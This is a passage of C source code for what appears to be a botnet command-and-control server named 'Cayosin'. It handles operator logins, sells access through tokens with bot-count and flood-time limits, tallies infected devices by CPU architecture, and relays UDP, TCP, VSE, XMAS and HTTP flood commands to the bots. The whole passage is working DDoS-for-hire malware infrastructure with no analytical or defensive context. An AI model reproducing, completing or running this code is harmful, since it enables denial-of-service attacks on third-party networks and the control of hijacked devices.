		        if(send(myfd, "\x1b[1;36mPassword: \x1b[37m", strlen("\x1b[1;36mPassword: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(new_pass, 0, sizeof(new_pass));
				while(ret = read(myfd, new_pass, sizeof(new_pass)))
				{
					new_pass[ret] = '\0';
					trim(new_pass);
					if(strlen(new_pass) < 3) continue;
					break;
				}
				trim(new_pass);
				sleep(0.5);
		        if(send(myfd, "\x1b[1;36mAdmin?(\x1b[1;33m0 = no, 1 = yes\x1b[1;36m): \x1b[37m", strlen("\x1b[1;36mAdmin?(\x1b[1;33m0 = no, 1 = yes\x1b[1;36m): \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(new_type, 0, sizeof(new_type));
				while(ret = read(myfd, new_type, sizeof(new_type)))
				{
					new_type[ret] = '\0';
					trim(new_type);
					if(strlen(new_type) < 1) continue;
					break;
				}
				trim(new_type);
				new_typee = atoi(new_type);
				sleep(0.5);
		        if(send(myfd, "\x1b[1;36mExpiration(\x1b[1;33mDD/MM/YYYY Ex: 02/03/2019\x1b[1;36m): \x1b[37m", strlen("\x1b[1;36mExpiration(\x1b[1;33mDD/MM/YYYY Ex: 02/03/2019\x1b[1;36m): \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(new_expire, 0, sizeof(new_expire));
				while(ret = read(myfd, new_expire, sizeof(new_expire)))
				{
					new_expire[ret] = '\0';
					trim(new_expire);
					if(strlen(new_expire) < 8) continue;
					break;
				}
				trim(new_expire);
				sleep(0.5);
		        if(send(myfd, "\x1b[1;36mMax Bots: \x1b[37m", strlen("\x1b[1;36mMax Bots: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(new_bots, 0, sizeof(new_bots));
				if(new_bc) new_bc = 0;
				while(ret = read(myfd, new_bots, sizeof(new_bots)))
				{
					new_bots[ret] = '\0';
					trim(new_bots);
					if(strlen(new_bots) < 1) continue;
					break;
				}
				trim(new_bots);
				new_bc = atoi(new_bots);
				sleep(0.5);
		        if(send(myfd, "\x1b[1;36mMax Flood Time(seconds): \x1b[37m", strlen("\x1b[1;36mMax Flood Time(seconds): \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(new_seconds, 0, sizeof(new_seconds));
				if(new_secs) new_secs = 0;
				while(ret = read(myfd, new_seconds, sizeof(new_seconds)))
				{
					new_seconds[ret] = '\0';
					trim(new_seconds);
					if(strlen(new_seconds) < 1) continue;
					break;
				}
				trim(new_seconds);
				new_secs = atoi(new_seconds);
				sleep(0.5);
		        if(send(myfd, "\x1b[1;36mCooldown(seconds): \x1b[37m", strlen("\x1b[1;36mCooldown(seconds): \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(new_cd, 0, sizeof(new_cd));
				if(new_cooldown) new_cooldown = 0;
				while(ret = read(myfd, new_cd, sizeof(new_cd)))
				{
					new_cd[ret] = '\0';
					trim(new_cd);
					if(strlen(new_cd) < 1) continue;
					break;
				}
				trim(new_cd);
				new_cooldown = atoi(new_cd);
				FILE *uinfo = fopen(ACC_FILE, "a+");
				fprintf(uinfo, "%s %s %d %s %d %d %d\n", new_user, new_pass, new_typee, new_expire, new_bc, new_secs, new_cooldown);
				fclose(uinfo);
				printf("\x1b[1;36m%s\x1b[37m added user [\x1b[1;33m%s\x1b[37m]\n", managers[myfd].username, new_user);
				sprintf(str, "\x1b[1;36m%s\x1b[37m added user [\x1b[1;33m%s\x1b[37m]\r\n", managers[myfd].username, new_user);
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				new_bc = 0;
				memset(uinfo, 0, sizeof(uinfo));
				memset(new_user, 0, sizeof(new_user));
				memset(new_pass, 0, sizeof(new_pass));
				memset(new_type, 0, sizeof(new_type));
				memset(new_expire, 0, sizeof(new_expire));
				memset(new_bots, 0, sizeof(new_bots));
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(!strcmp(buffer, ". deluser") || !strcmp(buffer, ". DELUSER"))
		{
			if(managers[myfd].admin)
			{
				int kdm;
				char deluser[50];
				if(send(myfd, "\x1b[1;36mUsername: \x1b[37m", strlen("\x1b[1;36mUsername: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(deluser, 0, sizeof(deluser));
		        while(fdgets(deluser, sizeof deluser, myfd) < 1)
				{
					trim(deluser);
					if(strlen(deluser) < 3) continue;
					break;
				}
				trim(deluser);
				rmstr(deluser, ACC_FILE);
				sprintf(str, "\x1b[1;36mDeleted User \x1b[0m(\x1b[1;36m%s\x1b[0m)...\r\n", deluser);
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) goto end;
				for(kdm = 0; kdm < MAXFDS; kdm++)
				{
					if(!managers[kdm].connected) continue;
					if(!strcmp(managers[kdm].username, deluser))
					{
						close(kdm);
						managers[kdm].connected = 0;
						memset(managers[kdm].ip, 0, sizeof(managers[kdm].ip));
						memset(managers[kdm].username, 0, sizeof(managers[kdm].username));
						memset(managers[kdm].expire, 0, sizeof(managers[kdm].expire));
						memset(managers[kdm].inputprompt, 0, sizeof(managers[kdm].inputprompt));
					}
				}
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(strstr(buffer, ". checktok") || strstr(buffer, ". CHECKTOK"))
		{
			int lol;
			char *token = buffer+strlen(". checktok ");
			if(strlen(token) < 1)
			{
	            sprintf(str, "Checktok - Invalid Syntax: \x1b[33m. CHECKTOK [TOKEN]\x1b[37m\r\n");
	            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
			else
			{
				if(managers[myfd].admin)
				{
				    dp=fopen(TOKEN_FILE, "r");
				    if(dp != NULL)
					{
					    while(!feof(dp)) 
						{
								y=fgetc(dp);
								++x;
					    }
					    int z=0;
					    rewind(dp);
					    while(z!=x-1) 
						{
							fscanf(dp, "%s %d %s %d %d %d", rtokens[z].token, &rtokens[z].admin, rtokens[z].expire, &rtokens[z].maxbots, &rtokens[z].maxseconds, &rtokens[z].cooldown);
							++z;
					    }
						for(lol = 0; lol < MAXFDS; lol++)
						{
							if(!strcmp(rtokens[lol].token, token))
							{
								sprintf(str, "\x1b[0m[\x1b[1;36m+\x1b[0m]----\x1b[1;36m Token Info\x1b[0m ----[\x1b[1;36m+\x1b[0m]\x1b[37m\r\n");
								if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
								sprintf(str, INFO" \x1b[1;33mToken: %s\r\n", token);
								if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
								sprintf(str, INFO" \x1b[1;33mExpiry: %s\r\n", rtokens[lol].expire);
								if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
								sprintf(str, INFO" \x1b[1;33mMax Bots: %d\r\n", rtokens[lol].maxbots);
								if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
								sprintf(str, INFO" \x1b[1;33mMax Boot Time: %d\r\n", rtokens[lol].maxseconds);
								if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
								sprintf(str, INFO" \x1b[1;33mCooldown: %d\r\n", rtokens[lol].cooldown);
								if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
							}
						}
					}
				}
				else
				{
					sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
					if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				}
			}
		}
		else if(!strcmp(buffer, ". gentoken") || !strcmp(buffer, ". GENTOKEN"))
		{
			if(managers[myfd].admin)
			{
				int amt, token_amt, mbots, msecs, at_cd;
				char tokens[50];
				char expire[10];
				char maxbots[10];
				char maxsecs[10];
				char atcd[10];
				char *new_token;
				if(send(myfd, "\x1b[1;36mHow Many Tokens?: \x1b[37m", strlen("\x1b[1;36mHow Many Tokens?: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(tokens, 0, sizeof(tokens));
		        while(fdgets(tokens, sizeof tokens, myfd) < 1)
				{
					trim(tokens);
					if(strlen(tokens) < 3) continue;
					break;
				}
				trim(tokens);
				token_amt = atoi(tokens);
				sleep(0.3);
				if(send(myfd, "\x1b[1;36mExpiry(month or year): \x1b[37m", strlen("\x1b[1;36mExpiry(month or year): \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(expire, 0, sizeof(expire));
		        while(fdgets(expire, sizeof expire, myfd) < 1)
				{
					trim(expire);
					if(strlen(expire) < 3) continue;
					break;
				}
				trim(expire);
				sleep(0.3);
				if(send(myfd, "\x1b[1;36mMax Bots: \x1b[37m", strlen("\x1b[1;36mMax Bots: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(maxbots, 0, sizeof(maxbots));
		        while(fdgets(maxbots, sizeof maxbots, myfd) < 1)
				{
					trim(maxbots);
					if(strlen(maxbots) < 3) continue;
					break;
				}
				trim(maxbots);
				mbots = atoi(maxbots);
				sleep(0.3);
				if(send(myfd, "\x1b[1;36mMax Flood Time\x1b[32m: \x1b[37m", strlen("\x1b[1;36mMax Flood Time\x1b[32m: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(maxsecs, 0, sizeof(maxsecs));
		        while(fdgets(maxsecs, sizeof maxsecs, myfd) < 1)
				{
					trim(maxsecs);
					if(strlen(maxsecs) < 3) continue;
					break;
				}
				trim(maxsecs);
				msecs = atoi(maxsecs);
				sleep(0.3);
				if(send(myfd, "\x1b[1;36mCooldown: \x1b[37m", strlen("\x1b[1;36mCooldown: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
				memset(atcd, 0, sizeof(atcd));
		        while(fdgets(atcd, sizeof atcd, myfd) < 1)
				{
					trim(atcd);
					if(strlen(atcd) < 3) continue;
					break;
				}
				trim(atcd);
				at_cd = atoi(atcd);
				FILE *toks;
				toks = fopen(TOKEN_FILE, "a+");
				redo_toks:
				if(toks == NULL)
				{
					fclose(toks);
					toks = fopen(TOKEN_FILE, "w");
					goto redo_toks;
				}
				for(amt = 0; amt < token_amt; amt++)
				{
					new_token = makestring();
					fprintf(toks, "%s 0 %s %d %d %d\n", new_token, expire, mbots, msecs, at_cd);
					sprintf(str, "\x1b[1;33mAdded Token \x1b[0m(\x1b[1;33m%s\x1b[0m) \x1b[1;36m%d\x1b[0m/\x1b[1;36m%d!\x1b[0m\r\n", new_token, amt+1, token_amt);
					if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				}
				fclose(toks);
			}
			else
			{
				sprintf(str, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
		}
		else if(strstr(buffer, ". resolve ") || strstr(buffer, ". RESOLVE "))
		{
			char *ip[100];
			char *website = buffer+strlen(". resolve ");
			if(strlen(website) > 1)
			{
	            trim(website);
				resolvehttp(website, ip);
				if(strlen(ip) < 7)
				{
		            sprintf(str, "\x1b[0m[\x1b[1;36mResolver\x1b[0m] \x1b[31mInvalid Syntax. \x1b[1;36mEx: resolve google.com\x1b[37m\r\n");
		            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				}
	            else
				{
		            sprintf(str, "\x1b[0m[\x1b[1;36mResolver\x1b[0m] \x1b[1;36m%s \x1b[0m-> \x1b[1;36m%s\x1b[37m\r\n", website, ip);
		            if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				}
			}
			memset(ip, 0, sizeof(ip));
		}
		else if(!strcmp(buffer, ". conns") || !strcmp(buffer, ". CONNS"))
		{
			countArch();
            if(botsOnline() == 0)
            {
                sprintf(str, "\x1b[1;36mUsers Online \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", usersOnline);
                if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(str, "\x1b[1;36mUsers Online \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", usersOnline);
                if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                if(ppc > 0)
                {
                    sprintf(str, "\x1b[1;36m.powerpc \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", ppc);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(sh4 > 0)
                {
                    sprintf(str, "\x1b[1;36m.sh4 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", sh4);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
				if(x86_64 > 0)
				{
                    sprintf(str, "\x1b[1;36m.x86_64 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", x86_64);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				}
				if(x86_32 > 0)
				{
                    sprintf(str, "\x1b[1;36m.x86_32 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", x86_32);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				}
                if(x86 > 0)
                {
                    sprintf(str, "\x1b[1;36m.x86 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", x86);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(i586 > 0)
                {
                	sprintf(str, "\x1b[1;36m.i586 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", i586);
                	if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(i686 > 0)
                {
                	sprintf(str, "\x1b[1;36m.i686 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", i686);
                	if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
				if(arm > 0)
				{
                    sprintf(str, "\x1b[1;36m.arm \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", arm);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
				}
                if(armv4 > 0)
                {
                    sprintf(str, "\x1b[1;36m.armv4 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", armv4);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(armv5 > 0)
                {
                    sprintf(str, "\x1b[1;36m.armv5 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", armv5);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(armv6 > 0)
                {
                    sprintf(str, "\x1b[1;36m.armv6 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", armv6);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(armv7 > 0)
                {
                    sprintf(str, "\x1b[1;36m.armv7 \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", armv7);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(mips > 0)
                {
                    sprintf(str, "\x1b[1;36m.mips \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", mips);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(m68k > 0)
                {
                    sprintf(str, "\x1b[1;36m.m68k \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", m68k);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(debug > 0)
                {
                    sprintf(str, "\x1b[1;36m.debug \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", debug);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(sparc > 0)
                {
                    sprintf(str, "\x1b[1;36m.sparc \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", sparc);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
				if(rdp > 0)
                {
                    sprintf(str, "\x1b[1;36m.rdp \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", rdp);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(mipsel > 0)
                {
                    sprintf(str, "\x1b[1;36m.mipsel \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", mipsel);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(boxes > 0)
                {
                    sprintf(str, "\x1b[1;36m.servers \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", boxes);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(pmalinux > 0)
                {
                    sprintf(str, "\x1b[1;36m.pma.linux \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", pmalinux);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(pmawindows > 0)
                {
                    sprintf(str, "\x1b[1;36m.pma.windows \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", pmawindows);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown > 0)
                {
                    sprintf(str, "\x1b[1;36m.unknown \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", unknown);
                    if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(str, "\x1b[1;36mTotal Bots \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", botsOnline());
                if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
                if(managers[myfd].maxbots < botsOnline())
                {
                    sprintf(str, "\x1b[1;36mAvailable Bots \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", managers[myfd].maxbots);
                }
                else if(managers[myfd].maxbots > botsOnline())
                {
                    sprintf(str, "\x1b[1;36mAvailable Bots \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n", botsOnline());
                }
                if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
            }
		}
		else if(strstr(buffer, "< "))
		{
			char *msg2all = buffer+strlen("< "); // change this aswell if u want to change the trigger
			Send2Users(myfd, msg2all);
			sprintf(buffer, "%s", msg2all);
			status = 1;
		}
		else if(strstr(buffer, "* "))
		{
			int f;
			char mms[1024];
			if(managers[myfd].cdstatus)
			{
				sprintf(str, "\x1b[1;36m%s,\x1b[31m Server is Cooling Down - %d second(s) left...\x1b[0m\r\n", managers[myfd].username, managers[myfd].cooldown - managers[myfd].cdsecs);
				if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
			}
			else
			{
				char cmd2bots[1024];
				char *okl = buffer+strlen("* "); // change this aswell if u want to change trigger
				snprintf(buffer, sizeof(buffer), "%s", okl);
				snprintf(cmd2bots, sizeof(cmd2bots), "%s", buffer);
				char *bts = BOT_TRIGGER" ";
				char sdata[1024];
				int bl_found = 0;
				if(strstr(buffer, bts))
				{
					snprintf(sdata, sizeof(sdata), "%s", cmd2bots+strlen(bts)); // ip port time
					trim(sdata);
					int x;
					for(x = 0; sdata[x]; x++)
						sdata[x] = tolower(sdata[x]);
					char *flood_cmds[] = {
						"STD ",
						"UDP ",
						"TCP ",
						"CNC ",
						"VSE ",
						"XMAS ",
						"HTTP "
					};
					#define flood_cmds_size (sizeof(flood_cmds) / sizeof(unsigned char *))
					f = 0;
					for(x=0; x < flood_cmds_size; x++)
					{
						if(strlen(flood_cmds[x]) < 1) continue;
						if(strstr(sdata, flood_cmds[x]))
						{
							snprintf(sdata, sizeof(sdata), "%s", sdata+strlen(flood_cmds[x]));
							f = 1;
							break;
						}
					}
					if(f)
					{
						char *ret1 = strchr(sdata, ' ');
						trim(ret1);
						char *ret2 = strchr(ret1, ' ');
						trim(ret2);
						int attk_secs = atoi(ret2);
						for(x=0; x < MAXFDS; x++)
						{
							if(!strcmp(console[x].blacklist, ret1))
							{
								sprintf(str, "\x1b[1;36m%s\x1b[31m Attack Not Sent - Host \x1b[1;36m%s\x1b[31m is Blacklisted.\x1b[37m\r\n", managers[myfd].username, ret1);
							  	if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
								bl_found = 1;
							}
						}
						if(!bl_found)
						{
							if(attk_secs > managers[myfd].maxseconds)
							{
								sprintf(str, "\x1b[1;36m%s\x1b[31m Attack Not Sent - You exceeded your Max Flood Time.\x1b[37m\r\n", managers[myfd].username, managers[myfd].maxseconds);
							  	if(send(myfd, str, strlen(str), MSG_NOSIGNAL) == -1) return;
							}
							else
							{
								Act2Bots(myfd, cmd2bots);
								snprintf(mms, sizeof(mms), "[\x1b[32mReporting\x1b[37m] \x1b[1;36m%s: %s\x1b[0m", managers[myfd].username, cmd2bots);
								Act2ADMS(myfd, mms);
								memset(mms, 0, strlen(mms));
								status = 2;
								pthread_t cdthread;
							    struct cooldownArgs argg;
							    if(managers[myfd].cooldown > 0)
								{
								    argg.sock = myfd;
								    argg.seconds = managers[myfd].cooldown;
									pthread_create(&cdthread, NULL, &en_cooldown, (void *)&argg);
								}
							}
						}
					}
					else
					{
						Act2Bots(myfd, cmd2bots);
						snprintf(mms, sizeof(mms), "[\x1b[32mReporting\x1b[37m] \x1b[1;36m%s: %s\x1b[0m", managers[myfd].username, cmd2bots);
						Act2ADMS(myfd, mms);
						memset(mms, 0, strlen(mms));
						status = 2;
					}
					memset(sdata, 0, sizeof(sdata));
				}
				else
				{
					Act2Bots(myfd, cmd2bots);
					snprintf(mms, sizeof(mms), "[\x1b[32mReporting\x1b[37m] \x1b[1;36m%s: %s\x1b[0m", managers[myfd].username, cmd2bots);
					Act2ADMS(myfd, mms);
					memset(mms, 0, strlen(mms));
					status = 2;
				}
			}
		}
		else
		{
			sprintf(str, "\x1b[31mSpecify your Path. \x1b[1;36m< for Chat | * for Bots | . for ServerSide\x1b[37m...\r\n");
			if(strlen(managers[myfd].username) >= 2) if(send(myfd, str, strlen(str), 0) == -1) goto end;
			//status = 1;
		}
		trim(buffer);
		if(send(myfd, managers[myfd].inputprompt, strlen(managers[myfd].inputprompt), 0) == -1) goto end;
		if(status == 1) printf("\x1b[1;36m%s\x1b[0m: %s\x1b[37m\n", managers[myfd].username, buffer);
		if(status == 2) printf("\x1b[1;36m%s\x1b[0m Sent Command '\x1b[0m%s\x1b[37m'\n", managers[myfd].username, buffer);
		memset(str, 0, sizeof(str));
		memset(buffer, 0, sizeof(buffer));
		continue;
	}
	
	end:
	close(myfd);
	if(managers[myfd].connected && usersOnline > 0) usersOnline--;
	if(managers[myfd].connected) printf("\x1b[1;36m[\x1b[0m%s Disconnected\x1b[1;36m]\x1b[37m\n", managers[myfd].username);
	if(managers[myfd].connected) snprintf(u, sizeof(u), "\x1b[1;36m[\x1b[0m%s Disconnected!\x1b[1;36m]\x1b[37m", managers[myfd].username);
	Act2Users(myfd, u);
	memset(u, 0, sizeof(u));
	managers[myfd].connected = 0;
	memset(managers[myfd].ip, 0, sizeof(managers[myfd].ip));
	memset(managers[myfd].username, 0, sizeof(managers[myfd].username));
	memset(managers[myfd].expire, 0, sizeof(managers[myfd].expire));
	memset(managers[myfd].inputprompt, 0, sizeof(managers[myfd].inputprompt));
	memset(buffer, 0, sizeof(buffer));
	memset(str, 0, sizeof(str));
	return;
}

void handle_clients_conns(void)
{
	pthread_t clientthread;
	int o, newclient;
	int true = 1;
	socklen_t c_size;
	int clientSock = -1;
	struct timeval to;
	struct sockaddr_in sock1;
	struct sockaddr_in clientname;
	to.tv_sec = 3;
	to.tv_usec = 0;
	fcntl(clientSock, F_SETFL, fcntl(clientSock, F_GETFL, 0) | O_NONBLOCK);
	if((clientSock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		printf(FAILED" Failed to Create Client Socket...\n");
	/*else
		printf("Created client socket!\n");*/
	setsockopt(clientSock, SOL_SOCKET, SO_RCVTIMEO, (char *)&to, sizeof(to));
	setsockopt(clientSock, SOL_SOCKET, SO_SNDTIMEO, (char *)&to, sizeof(to));
	setsockopt(clientSock, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(int));
	sock1.sin_family = AF_INET;
	sock1.sin_port = htons(cnc_port);
	sock1.sin_addr.s_addr = INADDR_ANY;
    if(bind(clientSock, (struct sockaddr *) &sock1, sizeof(sock1)) < 0)
	{
		printf(FAILED" Failed to Bind Client Socket...\n");
		exit(0);
	}
	/*else
		printf("Client socket binded!\n");*/
	
	if((listen(clientSock, 1000)) == -1)
	{
		printf(FAILED" Client Socket Failed to Listen...\n");
		exit(0);
	}
	else
		printf(SUCCESS" Client Socket Now in Listening Mode on Port %d...\n", cnc_port);
	refresh:
	c_size = sizeof(clientname);
	while(newclient = accept(clientSock, (struct sockaddr *) &clientname, &c_size))
	{
		if(newclient < 0) continue;
		else
		{
		    struct clientListenerArgs args;
		    args.sock = newclient;
		    args.client = clientname;
			pthread_create(&clientthread, NULL, &clientHandler, (void *)&args);
			//printf("Server: connect from host %s\n", inet_ntoa(clientname.sin_addr));
			//printf("New client connected -> %s\n", inet_ntoa(clientname.sin_addr));
		}
	}
	close(clientSock);
	exit(0);
}

void handle_bots_conns(void)
{
	pthread_t botthread;
	int o, newbot;
	int true = 1;
	socklen_t c_size;
	int botSock = -1;
	struct timeval to;
	struct sockaddr_in sock1;
	struct sockaddr_in botname;
	to.tv_sec = 3;
	to.tv_usec = 0;
	fcntl(botSock, F_SETFL, fcntl(botSock, F_GETFL, 0) | O_NONBLOCK);
	if((botSock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		printf(FAILED" Failed to Create Client Socket...\n");
	/*else
		printf("Created client socket!\n");*/
	setsockopt(botSock, SOL_SOCKET, SO_RCVTIMEO, (char *)&to, sizeof(to));
	setsockopt(botSock, SOL_SOCKET, SO_SNDTIMEO, (char *)&to, sizeof(to));
	setsockopt(botSock, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(int));
	sock1.sin_family = AF_INET;
	sock1.sin_port = htons(bot_port);
	sock1.sin_addr.s_addr = INADDR_ANY;
    if(bind(botSock, (struct sockaddr *) &sock1, sizeof(sock1)) < 0)
	{
		printf(FAILED" Failed to Bind Bot Socket...\n");
		exit(0);
	}
	/*else
		printf("Client socket binded!\n");*/
	
	if((listen(botSock, 1000)) == -1)
	{
		printf(FAILED" Bot Socket Failed to Listen...\n");
		exit(0);
	}
	else
		printf(SUCCESS" Bot Socket Now in Listening Mode on Port %d...\n", bot_port);
	refresh:
	c_size = sizeof(botname);
	while(newbot = accept(botSock, (struct sockaddr *) &botname, &c_size))
	{
		if(newbot < 0) continue;
		else
		{
		    struct botListenerArgs args;
		    args.sock = newbot;
		    args.client = botname;
			pthread_create(&botthread, NULL, &botHandler, (void *)&args);
			//printf("Server: connect from host %s\n", inet_ntoa(botname.sin_addr));
			//printf("New bot connected -> %s\n", inet_ntoa(botname.sin_addr));
		}
	}
	close(botSock);
	return;
}

int main(int argc, char **argv)
{
	pthread_t clients_conns;
	if(argc > 3 || argc < 3)
	{
		printf(FAILED" Syntax Error: %s <cnc port> <bot port>\n", argv[0]);
		exit(0);
	}
	cnc_port = atoi(argv[1]);
	bot_port = atoi(argv[2]);
	srand(time(NULL) + getpid());
	printf(Cayosin" \x1b[1;36mStarted under TTY!\x1b[37m\n");
	pthread_create(&clients_conns, NULL, &handle_clients_conns, NULL);
	handle_bots_conns();
}